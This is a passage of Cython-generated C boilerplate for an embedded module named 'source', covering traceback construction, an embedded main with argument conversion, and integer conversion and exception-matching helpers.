    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
